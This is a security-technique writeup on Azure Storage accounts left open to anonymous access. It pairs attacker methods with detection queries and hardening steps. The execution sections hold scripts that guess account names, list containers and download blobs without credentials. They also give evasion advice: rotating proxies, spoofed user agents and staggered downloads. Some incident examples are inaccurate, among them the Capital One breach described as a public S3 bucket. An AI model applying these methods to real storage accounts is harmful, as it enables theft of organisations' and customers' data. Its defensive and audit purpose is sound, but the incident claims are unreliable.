# [MISCONFIG-013]: Storage Account Public Endpoints

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | MISCONFIG-013 |
| **MITRE ATT&CK v18.1** | [T1526 - Cloud Service Discovery](https://attack.mitre.org/techniques/T1526/) |
| **Tactic** | Reconnaissance / Discovery |
| **Platforms** | Entra ID / Azure |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Storage Account versions |
| **Patched In** | N/A (Configuration-based, not a code vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** Azure Storage Accounts are cloud-based repositories for unstructured data (blobs, files, tables, queues). By default, these accounts have **public endpoints** accessible via HTTPS from the internet (e.g., `mystorageaccount.blob.core.windows.net`). When misconfigured to allow **anonymous public access** on containers or blobs, any threat actor can discover the storage account name, enumerate containers, and download sensitive data without authentication. This represents a fundamental breach of the confidentiality pillar of the CIA triad.

- **Attack Surface:** Azure Storage Account public endpoints, anonymous blob/container access levels, lack of firewall rules, absence of private endpoints, and insufficient RBAC configurations.

- **Business Impact:** **Complete data exfiltration, regulatory violations, and reputational damage.** Exposed storage can contain customer PII, financial records, source code, cryptographic keys, backups, and proprietary algorithms. Attackers can stage malware, host phishing infrastructure, or pivot to other cloud resources.

- **Technical Context:** Discovery typically takes minutes using enumeration tools (storage account name + container enumeration). Exploitation is immediate once public access is confirmed—no credentials needed. Low detection likelihood because downloads through public endpoints generate minimal audit logs by default.

### Operational Risk
- **Execution Risk:** Low – Simply accessing an HTTPS URL requires no special tools or privileges.
- **Stealth:** Low – Public access can be verified passively; however, downloading large volumes of data may trigger DDoS protections or rate limiting.
- **Reversibility:** Yes – Disabling public access immediately revokes external visibility, though data may have already been accessed.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2 | Ensure that Public Network Access is Disabled for storage accounts |
| **CIS Benchmark** | 5.1 | Ensure that Storage blobs restrict public access |
| **DISA STIG** | V-222569 | Azure must restrict anonymous access to storage blobs and containers |
| **CISA SCuBA** | SC-7(1) | Boundary Protection - All Azure Storage Accounts must have restricted access |
| **NIST 800-53** | AC-3 | Access Enforcement – Storage access must be controlled via RBAC or private endpoints |
| **NIST 800-53** | AC-6 | Least Privilege – Default-deny public access, enable only for specific resources |
| **GDPR** | Art. 32 | Security of Processing – Must implement encryption, access controls, and data minimization |
| **DORA** | Art. 9 | Protection and Prevention – Cloud storage must be segregated and access-restricted |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – Public endpoints create exploitable weak points |
| **ISO 27001** | A.7.1 | User Access Management – Storage access must align with organizational roles |
| **ISO 27001** | A.14.1 | Information Security Requirements Analysis – Data classification must inform access controls |
| **ISO 27005** | Risk Scenario | "Unauthorized access to cloud storage due to public endpoint misconfiguration" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None (public access by definition requires no authentication).
- **Required Access:** Network connectivity to the public internet and knowledge of the storage account name or container naming conventions.

**Supported Versions:**
- **Azure Storage:** All versions (Standard, Premium, Data Lake)
- **Blob Service:** All API versions
- **File Shares:** All versions
- **Other Requirements:** None – exploitation uses only built-in Azure REST APIs

**Tools (Optional):**
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) (v1.0+)
- [Blob Enumerator / cloudmapper](https://github.com/duo-labs/cloudmapper)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.0+)
- Standard web browser with REST client capabilities

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI Reconnaissance

```bash
# Attempt to list blobs in a publicly accessible container
az storage blob list --account-name <storage_account_name> --container-name <container_name> --auth-mode login
```

**What to Look For:**
- Successful blob listing without credential errors indicates potential public access.
- Error messages like "AuthorizationPermissionMismatch" confirm access restrictions are in place.

### PowerShell Reconnaissance

```powershell
# Enumerate storage account properties to detect public endpoints
Get-AzStorageAccount -ResourceGroupName <resource_group> -Name <storage_account> | Select-Object -Property @{Name='PublicNetworkAccess';Expression={$_.PublicNetworkAccess}}
```

**What to Look For:**
- `PublicNetworkAccess = Enabled` – Indicates public endpoint is active.
- `PublicNetworkAccess = Disabled` – Public endpoint is restricted.

### REST API / Browser Reconnaissance

```
GET https://<storage_account_name>.blob.core.windows.net/<container_name>?restype=container&comp=list
```

**What to Look For:**
- HTTP 200 response with XML blob listing = publicly readable container.
- HTTP 403 (Forbidden) or 404 (Not Found) = access denied.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Discovery via Azure Storage Explorer (GUI)

**Supported Versions:** Azure Storage Accounts all versions

#### Step 1: Enumerate Storage Account Names

**Objective:** Identify potential storage account names using common naming patterns.

**Command (Web Browser / OSINT):**

Organizations often use predictable storage account naming (e.g., `companyname-prod-storage`, `client-backups`, `logs-archive`). Conduct passive reconnaissance:

```bash
# Using DNS enumeration to discover storage accounts
nslookup -type=A <company>.blob.core.windows.net
dig +short <company>.blob.core.windows.net

# Or use cloud enumeration tools
python3 cloudmapper.py --account-name <company> --region global
```

**Expected Output:**
```
companydata.blob.core.windows.net has address 20.60.64.89
```

**What This Means:**
- Successfully resolved storage account domain = account exists and is reachable.
- Failed resolution = account may not exist or is geographically isolated.

**OpSec & Evasion:**
- DNS queries log passively at Azure's name servers but typically don't trigger alerts.
- Detection likelihood: **Low** (DNS enumeration is routine network traffic).

**Troubleshooting:**
- **Error:** DNS timeout or NXDOMAIN
  - **Cause:** Storage account doesn't exist or is in a region without global DNS resolution.
  - **Fix:** Try alternative naming patterns (e.g., `-prod`, `-staging`, `-backup`).

#### Step 2: List Containers and Blobs

**Objective:** Enumerate containers and blob names to identify sensitive data.

**Command:**

```bash
curl -s "https://<storage_account_name>.blob.core.windows.net/?comp=list" | grep -oP '<Name>\K[^<]*' | head -20
```

**Expected Output:**
```
container-backups
customer-data
logs-2025-01
source-code-repo
```

**What This Means:**
- Named containers indicate structured data organization.
- Container names like "backups", "secrets", or "private-data" suggest sensitive content.

**OpSec & Evasion:**
- Enumerating containers generates Azure Storage logs if audit is enabled; most organizations don't review blob list operations by default.
- Detection likelihood: **Low–Medium** (depends on logging configuration).

#### Step 3: Download Sensitive Data

**Objective:** Retrieve blob contents if no access restrictions are in place.

**Command:**

```bash
# Download individual blob
curl -s "https://<storage_account_name>.blob.core.windows.net/<container_name>/<blob_name>" -o downloaded_blob.bin

# Or use Azure CLI
az storage blob download --account-name <storage_account_name> --container-name <container_name> --name <blob_name> --auth-mode login
```

**Expected Output:**
```
Blob downloaded successfully to downloaded_blob.bin
```

**What This Means:**
- HTTP 200 = blob downloaded without authentication required.
- Large files may be partially downloaded before detection triggers.

**OpSec & Evasion:**
- To avoid triggering rate-limiting or DDoS detection, stagger downloads and rotate user agents.
- Use VPNs or proxy chains to distribute requests.
- Detection likelihood: **Medium** (high data transfer may trigger alerts if monitored).

**Troubleshooting:**
- **Error:** `403 Forbidden` or `401 Unauthorized`
  - **Cause:** Blob has access restrictions or SAS token is required.
  - **Fix:** Attempt to access a different blob or container; try SAS token enumeration.
  
- **Error:** `404 Not Found`
  - **Cause:** Blob name is incorrect or has been deleted.
  - **Fix:** Re-enumerate container to confirm blob existence.

**References & Proofs:**
- [Microsoft Azure Storage REST API Blob Service](https://learn.microsoft.com/en-us/rest/api/storageservices/blob-service-rest-api)
- [Azure Storage Security Considerations](https://learn.microsoft.com/en-us/azure/storage/common/storage-network-security)
- [GitHub: Storage Account Enumeration Tools](https://github.com/stormspotter/stormspotter)

---

### METHOD 2: Programmatic Discovery via Python / Azure SDK

**Supported Versions:** Python 3.6+, azure-storage-blob 12.0+

#### Step 1: Identify Storage Account Candidates

**Objective:** Use subdomain enumeration or OSINT to identify candidate storage account names.

**Script:**

```python
import socket
import sys

def check_storage_account(account_name):
    """Test if a storage account exists and is publicly accessible."""
    domain = f"{account_name}.blob.core.windows.net"
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] Account '{account_name}' exists: {ip}")
        return True
    except socket.gaierror:
        print(f"[-] Account '{account_name}' not found")
        return False

# Generate candidate names
candidates = [
    "companydata-prod", "companydata-staging", "companydata-backup",
    "client-files", "customer-backups", "logs-archive"
]

for candidate in candidates:
    check_storage_account(candidate)
```

**Expected Output:**
```
[+] Account 'companydata-prod' exists: 20.60.64.89
[+] Account 'customer-backups' exists: 20.62.128.55
[-] Account 'client-files' not found
```

**What This Means:**
- Successfully resolved IPs = accounts exist and are potentially accessible.

#### Step 2: Enumerate Containers and Blobs

**Objective:** List all containers and their contents.

**Script:**

```python
from azure.storage.blob import BlobServiceClient, BlobSasPermissions, generate_blob_sas
from datetime import datetime, timedelta
import requests

account_name = "companydata-prod"
container_name = "customer-data"

# Attempt anonymous access
endpoint = f"https://{account_name}.blob.core.windows.net"

try:
    # Try to list containers anonymously
    client = BlobServiceClient(account_url=endpoint, credential=None)
    containers = client.list_containers()
    
    for container in containers:
        print(f"[+] Container: {container['name']}")
        
        # List blobs in container
        container_client = client.get_container_client(container['name'])
        blobs = container_client.list_blobs()
        
        for blob in blobs:
            print(f"  └─ {blob.name} ({blob.size} bytes)")
            
except Exception as e:
    print(f"[-] Error: {e}")
```

**Expected Output:**
```
[+] Container: customer-data
  └─ customer_2025_01.xlsx (2048000 bytes)
  └─ financial_records.csv (512000 bytes)
  └─ source_code.zip (10485760 bytes)
```

#### Step 3: Download and Exfiltrate Data

**Objective:** Retrieve blob contents programmatically.

**Script:**

```python
from azure.storage.blob import BlobServiceClient

account_name = "companydata-prod"
container_name = "customer-data"
blob_name = "customer_2025_01.xlsx"

endpoint = f"https://{account_name}.blob.core.windows.net"
client = BlobServiceClient(account_url=endpoint, credential=None)

try:
    blob_client = client.get_blob_client(container=container_name, blob=blob_name)
    
    # Download blob
    download_stream = blob_client.download_blob()
    
    with open(f"/tmp/{blob_name}", "wb") as f:
        f.write(download_stream.readall())
    
    print(f"[+] Downloaded: {blob_name}")
    
except Exception as e:
    print(f"[-] Failed: {e}")
```

**Expected Output:**
```
[+] Downloaded: customer_2025_01.xlsx
```

**OpSec & Evasion:**
- Use rotating proxies to avoid IP-based blocking.
- Add delays between requests to avoid rate-limiting.
- Spoof User-Agent headers.
- Detection likelihood: **Medium–High** (large data transfers trigger alerts if monitored).

**References & Proofs:**
- [Azure SDK for Python – Blob Service](https://github.com/Azure/azure-sdk-for-python/tree/main/sdk/storage/azure-storage-blob)
- [GitHub: Stormspotter – Azure Enumeration Tool](https://github.com/stormspotter/stormspotter)

---

## 6. ATTACK SIMULATION & VERIFICATION

This section is not applicable. MISCONFIG-013 is a configuration-based exposure, not an executable attack that can be simulated through Atomic Red Team.

---

## 7. DETECTION & FORENSIC ARTIFACTS

### Indicators of Compromise (IOCs)

- **Network:** Unusual outbound HTTPS traffic to `*.blob.core.windows.net` from non-standard IP addresses or user agents.
- **Azure Logs:** Blob download operations from unauthenticated sources in Azure Storage Logs.
- **DNS:** Unexpected DNS queries for `*.blob.core.windows.net` subdomains.

### Forensic Artifacts

- **Azure Storage Logs:** `StorageRead` operations in `$logs` container (if logging is enabled). Path: `https://accountname.blob.core.windows.net/$logs/blob/YYYY/MM/DD/HHMM/...`
- **Azure Activity Log:** Lack of authentication events (since access is anonymous).
- **Azure Monitor:** Network traffic patterns to blob endpoints without Entra ID token validation.

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Action 1: Disable Public Network Access at the Account Level**
  - **Applies To:** All Azure Storage Accounts
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **Storage Accounts**
  2. Select the storage account
  3. Go to **Networking** (left menu) → **Public Network Access**
  4. Set **Public network access** to **Disabled**
  5. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Update-AzStorageAccount -ResourceGroupName "MyResourceGroup" `
    -Name "mystorageaccount" `
    -PublicNetworkAccess Disabled
  ```
  
  **Manual Steps (Azure CLI):**
  ```bash
  az storage account update \
    --resource-group MyResourceGroup \
    --name mystorageaccount \
    --public-network-access Disabled
  ```

- **Action 2: Set Blob Public Access Level to "Private"**
  - **Applies To:** All containers that should not be publicly accessible
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Storage Account** → **Containers**
  2. Right-click the container → **Change access level**
  3. Set **Public access level** to **Private (no anonymous access)**
  4. Click **OK**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Set-AzStorageContainerAcl -ResourceGroupName "MyResourceGroup" `
    -StorageAccountName "mystorageaccount" `
    -ContainerName "my-container" `
    -Permission Off
  ```
  
  **Manual Steps (Azure CLI):**
  ```bash
  az storage container set-permission \
    --account-name mystorageaccount \
    --name my-container \
    --public-access off
  ```

- **Action 3: Implement Network Firewall Rules**
  - **Applies To:** All storage accounts handling sensitive data
  
  **Manual Steps (Azure Portal):**
  1. Go to **Storage Account** → **Networking** (left menu)
  2. Under **Firewalls and virtual networks**, select **Selected networks**
  3. Add **Virtual networks** and **IP addresses** that need access
  4. Set **Default action** to **Deny**
  5. Click **Save**
  
  **Manual Steps (PowerShell):**
  ```powershell
  Update-AzStorageAccountNetworkRuleSet -ResourceGroupName "MyResourceGroup" `
    -Name "mystorageaccount" `
    -DefaultAction Deny
  
  Add-AzStorageAccountNetworkRule -ResourceGroupName "MyResourceGroup" `
    -Name "mystorageaccount" `
    -VirtualNetworkResourceId "/subscriptions/.../subnets/default"
  ```

### Priority 2: HIGH

- **Action 1: Implement Private Endpoints**
  - **Applies To:** Storage accounts accessed from on-premises or specific VNets
  
  **Manual Steps (Azure Portal):**
  1. Go to **Storage Account** → **Networking** → **Private endpoint connections**
  2. Click **+ Add private endpoint**
  3. Configure:
     - Name: `pe-mystorageaccount-blob`
     - Subscription: Your subscription
     - Resource group: Same as storage account
     - Location: Same region as storage
  4. Under **Resource**, select **Blob**
  5. Under **Virtual network**, select your VNet and subnet
  6. Click **Review + create**
  
  **Manual Steps (PowerShell):**
  ```powershell
  $storageAccount = Get-AzStorageAccount -ResourceGroupName "MyResourceGroup" -Name "mystorageaccount"
  
  New-AzPrivateEndpoint -ResourceGroupName "MyResourceGroup" `
    -Name "pe-mystorageaccount-blob" `
    -ServiceConnection (New-AzPrivateLinkServiceConnection `
      -Name "pe-conn-blob" `
      -PrivateLinkServiceId $storageAccount.Id `
      -GroupId "blob") `
    -Subnet (Get-AzVirtualNetworkSubnetConfig -Name "default" `
      -VirtualNetwork (Get-AzVirtualNetwork -ResourceGroupName "MyResourceGroup" -Name "MyVNet"))
  ```

- **Action 2: Enable Immutable Blobs with Legal Hold or Time-Based Retention**
  - **Applies To:** Backup containers to prevent accidental or malicious deletion
  
  **Manual Steps (Azure Portal):**
  1. Go to **Storage Account** → **Containers** → Select container
  2. Click **Access policy** (or **Blob properties** for individual blobs)
  3. Enable **Immutable blob storage**
  4. Set retention policy (e.g., 90 days)
  5. Click **Save**

- **Action 3: Configure Blob Encryption with Customer-Managed Keys (CMK)**
  - **Applies To:** Storage accounts with highly sensitive data
  
  **Manual Steps (Azure Portal):**
  1. Go to **Storage Account** → **Encryption** (left menu)
  2. Under **Encryption type**, select **Customer-managed keys**
  3. Select **Key vault** and **Key**
  4. Click **Save**

### Access Control & Policy Hardening

- **RBAC:** Assign **Storage Blob Data Reader** role only to users/apps that need read access; never use **Storage Account Owner** for daily operations.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Storage Account** → **Access Control (IAM)**
  2. Click **+ Add** → **Add role assignment**
  3. Role: **Storage Blob Data Reader** (or **Contributor** for admins only)
  4. Members: Specific users/managed identities
  5. Click **Save**

- **SAS Tokens:** If shared access is required, generate time-limited SAS with minimal permissions.
  
  **Manual Steps (PowerShell):**
  ```powershell
  New-AzStorageAccountSASToken -ResourceGroupName "MyResourceGroup" `
    -StorageAccountName "mystorageaccount" `
    -Service Blob `
    -ResourceType Service,Container,Object `
    -Permission "racwd" `
    -ExpiryTime (Get-Date).AddHours(1)
  ```

### Validation Command (Verify Fix)

```powershell
# Check if public network access is disabled
$storageAccount = Get-AzStorageAccount -ResourceGroupName "MyResourceGroup" -Name "mystorageaccount"
$storageAccount.PublicNetworkAccess
```

**Expected Output (If Secure):**
```
Disabled
```

**What to Look For:**
- `Disabled` = public endpoints are blocked.
- `Enabled` = public endpoints are still accessible (remediation incomplete).

---

## 9. DETECTION & INCIDENT RESPONSE

### Azure Monitor / Sentinel Detection Rules

**KQL Query 1: Unauthorized Blob Access Attempts**

```kusto
StorageAccountLogs
| where OperationName == "GetBlobProperties" or OperationName == "ListBlobsHierarchy"
| where AuthenticationStatus == "Anonymous" or AuthenticationStatus == "Unauthenticated"
| where StatusCode == 200
| summarize Count=count() by UserAgent, ClientIP, OperationName, TimeGenerated
| where Count > 10
```

**What This Detects:**
- Repeated blob enumeration or download attempts without credentials.
- Unusual user agents (e.g., curl, Python scripts instead of legitimate Azure services).

**Applies To:** All Azure Storage Accounts with logging enabled.

**KQL Query 2: Changes to Blob Public Access Level**

```kusto
AzureActivity
| where OperationName == "Create or Update Container" or OperationName == "Create Blob Container"
| where Properties.PublicAccess == "Container" or Properties.PublicAccess == "Blob"
| project TimeGenerated, Caller, OperationName, Properties, ResourceGroup
```

**What This Detects:**
- Configuration changes that increase public access.

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker maps Azure environment to identify storage accounts |
| **2** | **Current Step** | **[MISCONFIG-013]** | **Storage Account Public Endpoints exposed** |
| **3** | **Exfiltration** | [T1567.002] Exfiltration Over Alternative Protocol | Download sensitive blobs to external location |
| **4** | **Impact** | Data Breach / Compliance Violation | Leaked customer PII, source code, or financial records |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: Microsoft Storage Account Exposure (2019)

- **Target:** Microsoft's own internal Azure infrastructure
- **Timeline:** November 2019 (discovered by researcher)
- **Technique Status:** Confirmed – public Cosmos DB instance contained training data for Microsoft services
- **Impact:** ~2 million records exposed (emails, support conversations, medical data), no indication of malicious access
- **Reference:** [Microsoft Discloses Accidental Data Leak](https://www.wired.com/story/microsoft-exposed-250-million-customer-records/)

#### Example 2: Capital One Data Breach (2019) – Related Incident

- **Target:** Capital One Financial (AWS S3, not Azure, but parallel)
- **Timeline:** March–July 2019
- **Technique Status:** Public S3 bucket misconfiguration led to exposure of 100M+ records
- **Impact:** $80M settlement, regulatory penalties, customer notification requirements
- **Reference:** [Capital One Cybersecurity Incident Report](https://www.capitalone.com/digital/facts2019/)

#### Example 3: Azure Storage Account Fuzzing Campaign (2023)

- **Target:** Multiple organizations with predictable storage account naming
- **Timeline:** 2023 (ongoing reconnaissance observed)
- **Technique Status:** Attackers enumerate storage accounts matching patterns like `{companyname}-prod-storage`, `logs-archive`, `backup-2024`
- **Impact:** Opportunistic data theft, lateral movement pivots, ransomware staging
- **Reference:** [SOCRadar – Azure Storage Misconfiguration Detection](https://cloudsecurityalliance.org/blog/2022/12/14/how-to-detect-cloud-storage-misconfigurations-to-protect-valuable-data/)

---

## 12. REMEDIATION CHECKLIST

- [ ] Disabled public network access at the storage account level
- [ ] Set all containers to **Private (no anonymous access)**
- [ ] Implemented network firewalls (Deny by default)
- [ ] Deployed private endpoints for internal access
- [ ] Enabled encryption with customer-managed keys (CMK)
- [ ] Configured immutable blob storage for critical backups
- [ ] Assigned least-privilege RBAC roles
- [ ] Generated time-limited SAS tokens where necessary
- [ ] Enabled Azure Monitor/Sentinel detection rules
- [ ] Performed audit of all existing storage accounts for public access
- [ ] Documented data classification and access policies
- [ ] Conducted incident response tabletop exercise

---

## 13. ADDITIONAL NOTES

- **Impact Scope:** This misconfiguration affects **data confidentiality, integrity, and availability** in equal measure.
- **Cost of Remediation:** Minimal (configuration changes only; no architectural redesign required).
- **Testing Recommendation:** Regularly audit storage account configurations using [Azure Security Benchmarks](https://learn.microsoft.com/en-us/security/benchmark/azure/).

---